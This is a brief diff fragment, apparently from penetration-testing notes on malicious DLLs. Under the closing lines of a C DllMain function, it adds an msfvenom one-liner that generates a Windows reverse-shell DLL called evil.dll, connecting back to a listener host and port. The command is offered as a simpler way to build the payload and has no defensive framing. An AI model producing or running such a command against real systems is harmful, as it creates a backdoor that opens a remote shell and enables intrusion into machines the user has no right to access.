@@ -44,4 +44,4 @@ LPVOID lpReserved ) // Reserved
     return TRUE;
 }
 ```
-
+Or even simpler: `msfvenom -p windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' -f dll > evil.dll`
